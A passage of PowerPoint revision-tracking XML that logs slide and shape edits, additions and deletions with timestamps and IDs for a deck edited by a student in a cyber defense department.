        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:20:59.206" v="399" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4271482761" sldId="338"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:20:59.206" v="399" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4271482761" sldId="338"/>
            <ac:spMk id="5" creationId="{D725F2E8-BF68-4E37-954D-C95F020753CC}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:18:48.930" v="339"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1531992139" sldId="339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701517021" sldId="340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1026576549" sldId="341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2582896346" sldId="342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97469201" sldId="343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2879546471" sldId="344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1515118274" sldId="345"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:27:22.169" v="499"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3624952614" sldId="346"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-08T11:53:10.512" v="1156"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3636908598" sldId="347"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-08T11:53:10.512" v="1156"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3636908598" sldId="347"/>
            <ac:spMk id="3" creationId="{F1919A29-26C6-4D1E-A1C6-6211B17B5114}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldMasterChg chg="addSp delSp modSp mod modSldLayout">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:17:10.265" v="49"/>
        <pc:sldMasterMkLst>
          <pc:docMk/>
          <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
        </pc:sldMasterMkLst>
        <pc:spChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:15:28.049" v="25" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <ac:spMk id="12" creationId="{ACDE7349-86AD-44D6-AA8E-27B59580BCA0}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="del mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:15:30.944" v="27" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <ac:picMk id="11" creationId="{5E4CAB39-1B2D-44CE-8268-FDE72F65FD74}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:20.745" v="31" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <ac:picMk id="13" creationId="{29BA69F9-0503-4067-AB7A-E231C86B3305}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:sldLayoutChg chg="addSp delSp modSp mod">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:29.477" v="34"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
          </pc:sldLayoutMkLst>
          <pc:spChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:28.596" v="33" actId="478"/>
            <ac:spMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
              <ac:spMk id="13" creationId="{D71B9B85-A69C-4275-AB35-1F85E8A3A50C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27.344" v="32" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
              <ac:picMk id="12" creationId="{BF057BE6-503B-4103-95D0-EA9DC6051FAE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6:29.477" v="34"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
              <ac:picMk id="14" creationId="{11C0864E-6448-44E1-AFE5-2E08773EEE8A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6:33.954" v="37"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
          </pc:sldLayoutMkLst>
          <pc:spChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:33.155" v="36" actId="478"/>
            <ac:spMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
              <ac:spMk id="11" creationId="{B63C686E-1AC5-45D3-8FDB-79687779A3D1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32.376" v="35" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
              <ac:picMk id="10" creationId="{29DFB0CE-644D-4ACB-B2C5-2FEC0001C51C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6:33.954" v="37"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
              <ac:picMk id="13" creationId="{9E849662-F097-4B69-ABDD-03264CF3CAD9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6:49.782" v="42"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
          </pc:sldLayoutMkLst>
          <pc:spChg chg="del mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:48.810" v="41" actId="478"/>
            <ac:spMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
              <ac:spMk id="11" creationId="{A381091B-D27E-4F91-B78D-67C95A1ECD96}"/>
            </ac:spMkLst>
          </pc:spChg>
          <pc:picChg chg="add mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:49.782" v="42"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
              <ac:picMk id="9" creationId="{1ECB84DA-A8BA-4128-B903-EB68DDB0E6FE}"/>
            </ac:picMkLst>
          </pc:picChg>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:46.776" v="38" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
              <ac:picMk id="10" creationId="{575D59D2-CA50-4BD3-885C-FF310F941F8E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00.139" v="45"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
          </pc:sldLayoutMkLst>
          <pc:spChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:16:58.979" v="44" actId="478"/>
            <ac:spMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
              <ac:spMk id="11" creationId="{6F4336A2-7505-4EE0-B3E2-F0A0CB5D09B8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6:57.930" v="43" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
              <ac:picMk id="10" creationId="{3290D07E-D76C-42CD-9A6F-11BE4CDA3820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00.139" v="45"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
              <ac:picMk id="13" creationId="{2ADE25BB-E09D-49C2-9D2C-C788645C9972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03.950" v="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
          </pc:sldLayoutMkLst>
          <pc:spChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:17:03.254" v="46" actId="478"/>
            <ac:spMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
              <ac:spMk id="11" creationId="{1D26493C-0C13-4AA6-B47B-9CC7D9D3A06F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7:03.254" v="46" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
              <ac:picMk id="10" creationId="{BA75D6C0-81DB-4FDD-A059-76501EBE9582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03.950" v="47"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
              <ac:picMk id="12" creationId="{8DC6B2BE-E411-42DC-A126-E1DD70931A5F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C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:17:10.265" v="49"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
          </pc:sldLayoutMkLst>
          <pc:spChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:17:09.382" v="48" actId="478"/>
            <ac:spMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
              <ac:spMk id="10" creationId="{7CED9D3A-ECB2-473D-BC30-C5E49AC36834}"/>
            </ac:spMkLst>
          </pc:spChg>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:17:09.382" v="48" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
              <ac:picMk id="9" creationId="{171B9225-0077-40F4-A200-2E04311B98F3}"/>
            </ac:picMkLst>
          </pc:picChg>
          <pc:picChg chg="add mod">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:17:10.265" v="49"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
              <ac:picMk id="12" creationId="{D6AD4521-2136-4714-9EA2-136D4E7C63AD}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
      </pc:sldMasterChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld sldOrd modMainMaster modSection">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:50:46.130" v="1903"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T09:00:57.500" v="116"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4271878798" sldId="256"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T09:00:57.500" v="116"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4271878798" sldId="256"/>
            <ac:spMk id="2" creationId="{3D9CB0BF-81E0-42EC-91C8-E32C844400CF}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T09:00:35.121" v="53"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4271878798" sldId="256"/>
            <ac:spMk id="3" creationId="{22379862-334E-462A-BC01-BB5250028995}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:19:26.699" v="124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89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:19:26.699" v="124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ord">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:20:12.577" v="132"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2956657893" sldId="271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711119976" sldId="276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331126702" sldId="276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380897034" sldId="27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3650578037" sldId="277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1731767942" sldId="278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3103984751" sldId="278"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:50:37.494" v="1902" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="428576480" sldId="279"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:50:46.130" v="1903"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2442887221" sldId="279"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T09:00:35.500" v="54" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3636908598" sldId="347"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2021-12-29T09:00:35.500" v="54" actId="27636"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3636908598" sldId="347"/>
            <ac:spMk id="3" creationId="{F1919A29-26C6-4D1E-A1C6-6211B17B5114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27:04.023" v="387" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="365798377" sldId="348"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:27:04.023" v="387" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="365798377" sldId="348"/>
            <ac:spMk id="2" creationId="{AA8B08DA-8E85-45A7-9142-736ACE68A3F3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27:00.724" v="384" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="365798377" sldId="348"/>
            <ac:spMk id="3" creationId="{E9FAF3EC-D595-4ABA-AF8D-D9EEAEB2D5B9}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:32:01.992" v="504" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3106261693" sldId="349"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:28:06.638" v="438" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3106261693" sldId="349"/>
            <ac:spMk id="2" creationId="{CAD0618D-48A2-4AE3-81F9-FCEDA07DC563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27:52.999" v="433" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3106261693" sldId="349"/>
            <ac:spMk id="3" creationId="{B9A09ED7-4ADC-42E1-A476-019BAB6F2944}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add del mod modCrop">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:31:55.844" v="499" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3106261693" sldId="349"/>
            <ac:picMk id="6" creationId="{87D139E7-B43B-4EF9-A171-2F3A018FA2E9}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:32:01.992" v="504" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3106261693" sldId="349"/>
            <ac:picMk id="8" creationId="{E73F41FF-FCE2-4B13-99A7-CFB94A73EB70}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:33:46.636" v="585"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="319041979" sldId="350"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:32:40.309" v="510"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="319041979" sldId="350"/>
            <ac:spMk id="2" creationId="{0A5F2BA0-8011-471F-AEB5-77E475A4D5D4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3:46.636" v="585"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="319041979" sldId="350"/>
            <ac:spMk id="3" creationId="{61DAB59D-5337-478A-85B8-B9A1F922BEFB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35:19.591" v="824" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3978286067" sldId="351"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:35:16.007" v="819"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3978286067" sldId="351"/>
            <ac:spMk id="2" creationId="{5C99D40B-CD94-48AC-8768-B2B126F072C7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5:19.591" v="824" actId="27636"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3978286067" sldId="351"/>
            <ac:spMk id="3" creationId="{84A5D00A-9CA6-435A-BCC5-0944C500168A}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:39:32.287" v="1060" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1724742321" sldId="352"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:35:29.349" v="830" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1724742321" sldId="352"/>
            <ac:spMk id="2" creationId="{C042270A-30BB-44B9-9906-57D6FCCC60C8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9:32.287" v="1060" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1724742321" sldId="352"/>
            <ac:spMk id="3" creationId="{B52B04EA-61EB-4FBE-81D1-40744CE57824}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp new mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:37:15.004" v="907" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="863911632" sldId="353"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:36:44.868" v="895"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="863911632" sldId="353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7:00.116" v="904" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="863911632" sldId="353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37:15.004" v="907" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="863911632" sldId="353"/>
            <ac:picMk id="6" creationId="{EDFB8ADB-4859-4AFC-B48E-AFEAC90EDF33}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:48:41.699" v="1880" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1621801038" sldId="354"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{89AA700A-C87B-4DC7-95D3-DD1D4BD93CCF}" dt="2022-01-02T20:48:34.399" v="1875" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1621801038" sldId="354"/>
            <ac:spMk id="2" creationId="{8D8D3D1B-BE26-4B92-AE92-6F3B1F5F1CE0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8:41.699" v="1880" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1621801038" sldId="354"/>
            <ac:spMk id="3" creationId="{D9A28D56-990B-433B-A98E-C091EC26F19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37:39.882" v="936"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="421932750" sldId="355"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
